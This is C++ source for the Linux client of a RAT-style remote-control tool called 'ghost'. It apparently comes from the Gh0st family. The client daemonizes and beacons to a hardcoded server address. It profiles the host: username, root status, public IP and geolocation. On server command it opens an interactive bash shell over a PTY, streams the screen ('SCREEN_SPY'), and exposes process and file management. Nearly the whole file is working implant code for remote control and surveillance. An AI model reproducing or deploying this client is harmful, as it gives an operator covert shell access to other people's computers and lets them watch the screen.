#include "common/commands.h"
#include "client/IOCPClient.h"
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/stat.h>
#include <pwd.h>
#include <string.h>
#include <termios.h>
#include <thread>
#include <fcntl.h>
#include <atomic>
#include <cerrno>
#include <csignal>
#include <sys/wait.h>
#include <pty.h>
#include <iostream>
#include <stdexcept>
#include <cstdio>
#include <memory>
#include <array>
#include <regex>
#include <fstream>
#include <map>
#include "ScreenHandler.h"
#include "SystemManager.h"
#include "FileManager.h"
#include "common/logger.h"

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);

// ============== 轻量 INI 配置文件读写（Linux 替代 Windows iniFile）==============
// 配置文件路径: ~/.config/ghost/config.ini
// 格式: key=value（按行存储，不分 section，足够简单场景使用）
class LinuxConfig
{
public:
    LinuxConfig()
    {
        // 确定配置目录
        const char* xdg = getenv("XDG_CONFIG_HOME");
        if (xdg && xdg[0]) {
            m_dir = std::string(xdg) + "/ghost";
        } else {
            const char* home = getenv("HOME");
            if (!home) home = "/tmp";
            m_dir = std::string(home) + "/.config/ghost";
        }
        m_path = m_dir + "/config.ini";
        Load();
    }

    std::string GetStr(const std::string& key, const std::string& def = "") const
    {
        auto it = m_data.find(key);
        return it != m_data.end() ? it->second : def;
    }

    void SetStr(const std::string& key, const std::string& value)
    {
        m_data[key] = value;
        Save();
    }

    int GetInt(const std::string& key, int def = 0) const
    {
        auto it = m_data.find(key);
        if (it != m_data.end()) {
            try { return std::stoi(it->second); } catch (...) {}
        }
        return def;
    }

    void SetInt(const std::string& key, int value)
    {
        m_data[key] = std::to_string(value);
        Save();
    }

private:
    std::string m_dir;
    std::string m_path;
    std::map<std::string, std::string> m_data;

    void Load()
    {
        std::ifstream f(m_path);
        std::string line;
        while (std::getline(f, line)) {
            size_t eq = line.find('=');
            if (eq != std::string::npos) {
                std::string k = line.substr(0, eq);
                std::string v = line.substr(eq + 1);
                m_data[k] = v;
            }
        }
    }

    void Save()
    {
        // 创建目录（mkdir -p 效果）
        mkdir(m_dir.c_str(), 0755);
        std::ofstream f(m_path, std::ios::trunc);
        for (auto& kv : m_data) {
            f << kv.first << "=" << kv.second << "\n";
        }
    }
};

// 远程地址：当前为写死状态，如需调试，请按实际情况修改
CONNECT_ADDRESS g_SETTINGS = { FLAG_GHOST, "192.168.0.55", "6543", CLIENT_TYPE_LINUX };

// 全局状态
State g_bExit = S_CLIENT_NORMAL;

// 伪终端处理类：继承自IOCPManager.
class PTYHandler : public IOCPManager
{
public:
    PTYHandler(IOCPClient* client) : m_client(client), m_running(false)
    {
        if (!client) {
            throw std::invalid_argument("IOCPClient pointer cannot be null");
        }

        // 创建伪终端
        if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
            throw std::runtime_error("Failed to create pseudo terminal");
        }

        // 设置伪终端为非阻塞模式
        int flags = fcntl(m_master_fd, F_GETFL, 0);
        fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);

        // 启动 Shell 进程
        startShell();
    }

    ~PTYHandler()
    {
        m_running = false;
        if (m_readThread.joinable()) m_readThread.join();
        close(m_master_fd);
        close(m_slave_fd);
        if (m_child_pid > 0) {
            kill(m_child_pid, SIGTERM);
            waitpid(m_child_pid, nullptr, 0);
        }
    }

    // 启动读取线程
    void Start()
    {
        bool expected = false;
        if (!m_running.compare_exchange_strong(expected, true)) return;
        m_readThread = std::thread(&PTYHandler::readFromPTY, this);
    }

    virtual VOID OnReceive(PBYTE data, ULONG size)
    {
        if (size && data[0] == COMMAND_NEXT) {
            Start();
            return;
        }
        std::string s((char*)data, size);
        Mprintf("%s", s.c_str());
        if (size > 0) {
            ssize_t total = 0;
            while (total < (ssize_t)size) {
                ssize_t written = write(m_master_fd, (char*)data + total, size - total);
                if (written == -1) {
                    if (errno == EAGAIN || errno == EINTR) continue;
                    Mprintf("OnReceive: write error %d\n", errno);
                    break;
                }
                total += written;
            }
        }
    }
private:
    int m_master_fd, m_slave_fd;
    IOCPClient* m_client;
    std::thread m_readThread;
    std::atomic<bool> m_running;
    pid_t m_child_pid;

    void startShell()
    {
        m_child_pid = fork();
        if (m_child_pid == -1) {
            close(m_master_fd);
            close(m_slave_fd);
            throw std::runtime_error("Failed to fork shell process");
        }
        if (m_child_pid == 0) {  // 子进程
            setsid();  // 创建新的会话
            dup2(m_slave_fd, STDIN_FILENO);
            dup2(m_slave_fd, STDOUT_FILENO);
            dup2(m_slave_fd, STDERR_FILENO);
            close(m_master_fd);
            close(m_slave_fd);

            // 关闭回显、禁用 ANSI 颜色、关闭 PS1
            const char* shell_cmd =
                "stty -echo -icanon; "  // 禁用回显和规范模式
                "export TERM=dumb; "    // 设置终端类型为 dumb
                "export LS_COLORS=''; " // 禁用颜色
                "export PS1='>'; "      // 设置提示符
                //"clear; "             // 清空终端
                "exec /bin/bash --norc --noprofile -i";  // 启动 Bash
            execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
            exit(1);
        }
    }

    void readFromPTY()
    {
        char buffer[4096];
        while (m_running) {
            ssize_t bytes_read = read(m_master_fd, buffer, sizeof(buffer) - 1);
            if (bytes_read > 0) {
                if (m_client) {
                    buffer[bytes_read] = '\0';
                    Mprintf("%s", buffer);
                    m_client->Send2Server(buffer, bytes_read);
                }
            }
            else if (bytes_read == -1) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    usleep(10000);
                } else {
                    Mprintf("readFromPTY: read error %d\n", errno);
                    break;
                }
            }
        }
    }
};

void* ShellworkingThread(void* param)
{
    try {
        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
        void* clientAddr = ClientObject.get();
        Mprintf(">>> Enter ShellworkingThread [%p]\n", clientAddr);
        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            std::unique_ptr<PTYHandler> handler(new PTYHandler(ClientObject.get()));
            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
            BYTE bToken = TOKEN_SHELL_START;
            ClientObject->Send2Server((char*)&bToken, 1);
            Mprintf(">>> ShellworkingThread [%p] Send: TOKEN_SHELL_START\n", clientAddr);
            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
                Sleep(1000);
        }
        Mprintf(">>> Leave ShellworkingThread [%p]\n", clientAddr);
    } catch (const std::exception& e) {
        Mprintf("*** ShellworkingThread exception: %s ***\n", e.what());
    }
    return NULL;
}

void* ScreenworkingThread(void* param)
{
    try {
        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
        void* clientAddr = ClientObject.get();
        Mprintf(">>> Enter ScreenworkingThread [%p]\n", clientAddr);
        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            std::unique_ptr<ScreenHandler> handler(new ScreenHandler(ClientObject.get()));
            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
            // 连接后立即发送完整的 BITMAPINFO 包（与 Windows 端 ScreenManager 流程一致）
            handler->SendBitmapInfo();
            Mprintf(">>> ScreenworkingThread [%p] Send: TOKEN_BITMAPINFO\n", clientAddr);
            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
                Sleep(1000);
        }
        Mprintf(">>> Leave ScreenworkingThread [%p]\n", clientAddr);
    } catch (const std::exception& e) {
        Mprintf("*** ScreenworkingThread exception: %s ***\n", e.what());
    }
    return NULL;
}

void* SystemManagerThread(void* param)
{
    try {
        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
        void* clientAddr = ClientObject.get();
        Mprintf(">>> Enter SystemManagerThread [%p]\n", clientAddr);
        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            std::unique_ptr<SystemManager> handler(new SystemManager(ClientObject.get()));
            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
            Mprintf(">>> SystemManagerThread [%p] Send: TOKEN_PSLIST\n", clientAddr);
            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
                Sleep(1000);
        }
        Mprintf(">>> Leave SystemManagerThread [%p]\n", clientAddr);
    } catch (const std::exception& e) {
        Mprintf("*** SystemManagerThread exception: %s ***\n", e.what());
    }
    return NULL;
}

void* FileManagerThread(void* param)
{
    try {
        std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, true));
        void* clientAddr = ClientObject.get();
        Mprintf(">>> Enter FileManagerThread [%p]\n", clientAddr);
        if (!g_bExit && ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            std::unique_ptr<FileManager> handler(new FileManager(ClientObject.get()));
            ClientObject->setManagerCallBack(handler.get(), IOCPManager::DataProcess, IOCPManager::ReconnectProcess);
            Mprintf(">>> FileManagerThread [%p] Send: TOKEN_DRIVE_LIST\n", clientAddr);
            while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit)
                Sleep(1000);
        }
        Mprintf(">>> Leave FileManagerThread [%p]\n", clientAddr);
    } catch (const std::exception& e) {
        Mprintf("*** FileManagerThread exception: %s ***\n", e.what());
    }
    return NULL;
}

int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
{
    if (szBuffer == nullptr || ulLength == 0)
        return TRUE;

    if (szBuffer[0] == COMMAND_BYE) {
        Mprintf("*** [%p] Received Bye-Bye command ***\n", user);
        g_bExit = S_CLIENT_EXIT;
    }
    else if (szBuffer[0] == COMMAND_SHELL) {
        std::thread(ShellworkingThread, nullptr).detach();
        Mprintf("** [%p] Received 'SHELL' command ***\n", user);
    }
    else if (szBuffer[0] == COMMAND_SCREEN_SPY) {
        std::thread(ScreenworkingThread, nullptr).detach();
        Mprintf("** [%p] Received 'SCREEN_SPY' command ***\n", user);
    }
    else if (szBuffer[0] == COMMAND_SYSTEM) {
        std::thread(SystemManagerThread, nullptr).detach();
        Mprintf("** [%p] Received 'SYSTEM' command ***\n", user);
    }
    else if (szBuffer[0] == COMMAND_LIST_DRIVE) {
        std::thread(FileManagerThread, nullptr).detach();
        Mprintf("** [%p] Received 'LIST_DRIVE' command ***\n", user);
    }
    else if (szBuffer[0] == COMMAND_NEXT) {
        Mprintf("** [%p] Received 'NEXT' command ***\n", user);
    }
    else {
        Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
    }
    return TRUE;
}

// 方法1: 解析 lscpu 命令（优先使用）
double parse_lscpu()
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("lscpu", "r"), pclose);
    if (!pipe) return -1.0;

    while (fgets(buffer.data(), buffer.size(), pipe.get())) {
        result += buffer.data();
    }

    // 匹配 "Model name" 中的频率（如 "Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz"）
    std::regex model_regex("@ ([0-9.]+)GHz");
    std::smatch match;
    if (std::regex_search(result, match, model_regex) && match.size() > 1) {
        try {
            return std::stod(match[1].str()) * 1000; // GHz -> MHz
        } catch (...) {}
    }
    return -1;
}

// 方法2: 解析 /proc/cpuinfo（备用）
double parse_cpuinfo()
{
    std::ifstream cpuinfo("/proc/cpuinfo");
    std::string line;
    std::regex freq_regex("@ ([0-9.]+)GHz");

    while (std::getline(cpuinfo, line)) {
        if (line.find("model name") != std::string::npos) {
            std::smatch match;
            if (std::regex_search(line, match, freq_regex) && match.size() > 1) {
                try {
                    return std::stod(match[1].str()) * 1000; // GHz -> MHz
                } catch (...) {}
            }
        }
    }
    return -1;
}

// ============== 系统信息采集函数（用于填充 LOGIN_INFOR） ==============

// 获取 Linux 发行版名称（如 "Ubuntu 24.04 LTS"）
std::string getLinuxDistro()
{
    std::ifstream f("/etc/os-release");
    std::string line;
    while (std::getline(f, line)) {
        if (line.compare(0, 13, "PRETTY_NAME=\"") == 0) {
            // PRETTY_NAME="Ubuntu 24.04.1 LTS"
            std::string name = line.substr(13);
            if (!name.empty() && name.back() == '"')
                name.pop_back();
            return name;
        }
    }
    // 回退：使用 uname
    struct utsname u = {};
    if (uname(&u) == 0) {
        return std::string(u.sysname) + " " + u.release;
    }
    return "Linux";
}

// 获取 CPU 核心数
int getCPUCores()
{
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    return n > 0 ? (int)n : 1;
}

// 获取系统内存（GB）
double getMemorySizeGB()
{
    struct sysinfo si = {};
    if (sysinfo(&si) == 0) {
        return si.totalram * (double)si.mem_unit / (1024.0 * 1024.0 * 1024.0);
    }
    return 0;
}

// 获取当前可执行文件路径
std::string getExePath()
{
    char buf[1024] = {};
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len > 0) {
        buf[len] = '\0';
        return buf;
    }
    return "";
}

// 获取文件大小（格式化为 "1.2M" 或 "123K"）
std::string getFileSize(const std::string& path)
{
    struct stat st = {};
    if (stat(path.c_str(), &st) != 0) return "?";
    char buf[32];
    if (st.st_size >= 1024 * 1024) {
        sprintf(buf, "%.1fM", st.st_size / (1024.0 * 1024.0));
    } else if (st.st_size >= 1024) {
        sprintf(buf, "%.1fK", st.st_size / 1024.0);
    } else {
        sprintf(buf, "%ldB", (long)st.st_size);
    }
    return buf;
}

// 获取当前用户名
std::string getUsername()
{
    struct passwd* pw = getpwuid(getuid());
    if (pw && pw->pw_name) return pw->pw_name;
    const char* u = getenv("USER");
    return u ? u : "?";
}

// 获取屏幕分辨率字符串（格式 "显示器数:宽*高"）
std::string getScreenResolution()
{
    // 尝试通过 xrandr 获取
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen("xrandr --current 2>/dev/null", "r"), pclose);
    if (pipe) {
        char line[256];
        // 匹配 "connected ... 1920x1080" 之类的行
        int monitors = 0;
        int maxW = 0, maxH = 0;
        std::regex res_regex("\\s+(\\d+)x(\\d+)\\+");
        while (fgets(line, sizeof(line), pipe.get())) {
            std::string s(line);
            if (s.find(" connected") != std::string::npos) {
                monitors++;
                std::smatch m;
                if (std::regex_search(s, m, res_regex) && m.size() > 2) {
                    int w = std::stoi(m[1].str());
                    int h = std::stoi(m[2].str());
                    if (w > maxW) maxW = w;
                    if (h > maxH) maxH = h;
                }
            }
        }
        if (monitors > 0 && maxW > 0) {
            char buf[64];
            sprintf(buf, "%d:%d*%d", monitors, maxW, maxH);
            return buf;
        }
    }
    return "0:0*0";
}

// 执行命令并返回输出
static std::string execCmd(const std::string& cmd)
{
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) return "";
    char buf[4096];
    std::string result;
    while (fgets(buf, sizeof(buf), pipe.get())) {
        result += buf;
    }
    // 去除尾部空白
    while (!result.empty() && (result.back() == '\n' || result.back() == '\r' || result.back() == ' '))
        result.pop_back();
    return result;
}

// HTTP GET 请求（优先 curl，备选 wget）
static std::string httpGet(const std::string& url, int timeoutSec = 5)
{
    std::string t = std::to_string(timeoutSec);
    // 优先使用 curl
    std::string r = execCmd("curl -s --max-time " + t + " \"" + url + "\" 2>/dev/null");
    if (!r.empty()) return r;
    // 备选 wget（Ubuntu 默认自带）
    r = execCmd("wget -qO- --timeout=" + t + " \"" + url + "\" 2>/dev/null");
    return r;
}

// 获取公网 IP（轮询多个查询源，与 Windows 端一致）
std::string getPublicIP()
{
    static const char* urls[] = {
        "https://checkip.amazonaws.com",
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://icanhazip.com",
        "https://ifconfig.me/ip",
    };
    for (auto& url : urls) {
        std::string ip = httpGet(url, 3);
        // 简单校验：非空且看起来像 IP（含有点号，长度合理）
        if (!ip.empty() && ip.find('.') != std::string::npos && ip.size() <= 45) {
            Mprintf("getPublicIP: %s (from %s)\n", ip.c_str(), url);
            return ip;
        }
    }
    Mprintf("getPublicIP: all sources failed\n");
    return "";
}

// 从 JSON 字符串中提取指定 key 的值（简易解析，不依赖 jsoncpp）
// 支持格式: "key": "value" 或 "key":"value"
static std::string jsonExtract(const std::string& json, const std::string& key)
{
    std::string needle = "\"" + key + "\"";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";
    size_t end = json.find('"', pos + 1);
    if (end == std::string::npos) return "";
    return json.substr(pos + 1, end - pos - 1);
}

// 获取 IP 地理位置（通过 ipinfo.io，与 Windows 端一致）
std::string getGeoLocation(const std::string& ip)
{
    if (ip.empty()) return "";
    std::string json = httpGet("https://ipinfo.io/" + ip + "/json", 5);
    if (json.empty()) return "";

    std::string country = jsonExtract(json, "country");
    std::string city = jsonExtract(json, "city");

    if (city.empty() && country.empty()) return "";
    if (city.empty()) return country;
    if (country.empty()) return city;
    return city + ", " + country;
}

// ============== 守护进程 ==============

// PID 文件路径（与配置文件同目录）
static std::string getPidFilePath()
{
    const char* xdg = getenv("XDG_CONFIG_HOME");
    std::string dir;
    if (xdg && xdg[0]) {
        dir = std::string(xdg) + "/ghost";
    } else {
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        dir = std::string(home) + "/.config/ghost";
    }
    mkdir(dir.c_str(), 0755);
    return dir + "/ghost.pid";
}

static void writePidFile()
{
    std::string path = getPidFilePath();
    std::ofstream f(path, std::ios::trunc);
    f << getpid() << std::endl;
}

static void removePidFile()
{
    unlink(getPidFilePath().c_str());
}

// 检查是否已有实例在运行
static bool isAlreadyRunning()
{
    std::ifstream f(getPidFilePath());
    int pid = 0;
    if (f >> pid && pid > 0) {
        // kill(pid, 0) 不发信号，仅检查进程是否存在
        if (kill(pid, 0) == 0) return true;
    }
    return false;
}

// 经典 Unix 双 fork 守护进程
static void daemonize()
{
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);   // 父进程退出

    setsid();                // 新会话，脱离终端

    pid = fork();            // 第二次 fork，防止重新获取控制终端
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    // 关闭标准文件描述符，重定向到 /dev/null
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDONLY);  // fd 0 = stdin
    open("/dev/null", O_WRONLY);  // fd 1 = stdout
    open("/dev/null", O_WRONLY);  // fd 2 = stderr
}

// 信号处理：收到 SIGTERM/SIGINT 时优雅退出
static void signalHandler(int sig)
{
    g_bExit = S_CLIENT_EXIT;
}

static void setupSignals()
{
    signal(SIGTERM, signalHandler);  // kill 默认信号
    signal(SIGINT,  signalHandler);  // Ctrl+C
    signal(SIGHUP,  SIG_IGN);       // 终端断开时忽略
    signal(SIGPIPE, SIG_IGN);       // 写入已关闭的 socket 时忽略
}

// 用法: ./ghost [-d] [IP] [端口]
//   -d  后台守护进程模式
// 示例: ./ghost -d 192.168.1.100 6543
int main(int argc, char* argv[])
{
    // 解析 -d 参数
    bool daemon_mode = false;
    int argStart = 1;
    if (argc > 1 && strcmp(argv[1], "-d") == 0) {
        daemon_mode = true;
        argStart = 2;
    }

    if (argStart + 1 < argc) {
        g_SETTINGS.SetServer(argv[argStart], atoi(argv[argStart + 1]));
    } else if (argStart < argc) {
        g_SETTINGS.SetServer(argv[argStart], g_SETTINGS.ServerPort());
    }

    // 守护进程化（必须在 getpid() 等调用之前）
    if (daemon_mode) {
        if (isAlreadyRunning()) {
            fprintf(stderr, "ghost is already running.\n");
            return 1;
        }
        daemonize();
    }

    // 信号处理
    setupSignals();

    // 写 PID 文件（守护进程模式下 PID 已变为子进程的）
    writePidFile();

    Mprintf("Server: %s:%d (PID: %d%s)\n",
            g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort(),
            getpid(), daemon_mode ? ", daemon" : "");

    char hostname[256] = {};
    gethostname(hostname, sizeof(hostname));

    LOGIN_INFOR logInfo;

    // 主机名
    strncpy(logInfo.szPCName, hostname, sizeof(logInfo.szPCName) - 1);
    logInfo.szPCName[sizeof(logInfo.szPCName) - 1] = '\0';

    // 操作系统版本（如 "Ubuntu 24.04 LTS"）
    std::string distro = getLinuxDistro();
    strncpy(logInfo.OsVerInfoEx, distro.c_str(), sizeof(logInfo.OsVerInfoEx) - 1);
    logInfo.OsVerInfoEx[sizeof(logInfo.OsVerInfoEx) - 1] = '\0';

    // 启动时间
    strncpy(logInfo.szStartTime, ToPekingTimeAsString(nullptr).c_str(), sizeof(logInfo.szStartTime) - 1);
    logInfo.szStartTime[sizeof(logInfo.szStartTime) - 1] = '\0';

    // CPU 主频
    double freq = parse_lscpu();
    if (freq < 0) freq = parse_cpuinfo();
    logInfo.dwCPUMHz = freq > 0 ? static_cast<unsigned int>(freq) : 0;

    // 摄像头
    logInfo.bWebCamIsExist = 0;

    // 可执行文件路径
    std::string exePath = getExePath();

    // 读取配置文件（~/.config/ghost/config.ini）
    LinuxConfig cfg;

    // 安装时间：首次运行写入，后续从配置文件读取
    std::string installTime = cfg.GetStr("install_time");
    if (installTime.empty()) {
        installTime = ToPekingTimeAsString(nullptr);
        cfg.SetStr("install_time", installTime);
        Mprintf("First run, install_time saved: %s\n", installTime.c_str());
    }

    // 公网 IP 和地理位置：缓存到配置文件，7 天过期后重新查询
    std::string pubIP = cfg.GetStr("public_ip");
    std::string location = cfg.GetStr("location");
    int ipTime = cfg.GetInt("ip_time");
    bool ipExpired = ipTime <= 0 || (time(nullptr) - ipTime > 7 * 86400);
    if (pubIP.empty() || location.empty() || ipExpired) {
        pubIP = getPublicIP();
        if (!pubIP.empty()) {
            location = getGeoLocation(pubIP);
            cfg.SetStr("public_ip", pubIP);
            cfg.SetStr("location", location);
            cfg.SetInt("ip_time", (int)time(nullptr));
            Mprintf("IP/Location updated: %s / %s\n", pubIP.c_str(), location.c_str());
        }
    }

    // ============== 填充 szReserved（19 个字段，与服务端 LOGIN_RES 枚举一一对应）==============
    logInfo.AddReserved("LNX");                                       // [0]  RES_CLIENT_TYPE
    logInfo.AddReserved(sizeof(void*) == 4 ? 32 : 64);               // [1]  RES_SYSTEM_BITS
    logInfo.AddReserved(getCPUCores());                               // [2]  RES_SYSTEM_CPU
    logInfo.AddReserved(getMemorySizeGB());                           // [3]  RES_SYSTEM_MEM
    logInfo.AddReserved(exePath.c_str());                             // [4]  RES_FILE_PATH
    logInfo.AddReserved("?");                                         // [5]  RES_RESVERD
    logInfo.AddReserved(installTime.c_str());                         // [6]  RES_INSTALL_TIME
    logInfo.AddReserved("?");                                         // [7]  RES_INSTALL_INFO
    logInfo.AddReserved(sizeof(void*) == 4 ? 32 : 64);               // [8]  RES_PROGRAM_BITS
    logInfo.AddReserved("");                                          // [9]  RES_EXPIRED_DATE
    logInfo.AddReserved(location.c_str());                            // [10] RES_CLIENT_LOC
    logInfo.AddReserved(pubIP.c_str());                               // [11] RES_CLIENT_PUBIP
    logInfo.AddReserved("v1.0.0");                                    // [12] RES_EXE_VERSION
    logInfo.AddReserved(getUsername().c_str());                        // [13] RES_USERNAME
    logInfo.AddReserved(getuid() == 0 ? 1 : 0);                      // [14] RES_ISADMIN
    logInfo.AddReserved(getScreenResolution().c_str());               // [15] RES_RESOLUTION
    logInfo.AddReserved("");                                          // [16] RES_CLIENT_ID（服务端自动计算）
    logInfo.AddReserved((int)getpid());                               // [17] RES_PID
    logInfo.AddReserved(getFileSize(exePath).c_str());                // [18] RES_FILESIZE

    std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, false));
    ClientObject->setManagerCallBack(NULL, DataProcess, NULL);
    while (!g_bExit) {
        clock_t c = clock();
        if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
            Sleep(5000);
            continue;
        }

        ClientObject->SendLoginInfo(logInfo.Speed(clock() - c));

        do {
            Sleep(5000);
        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit);
    }

    Logger::getInstance().stop();
    removePidFile();
    return 0;
}
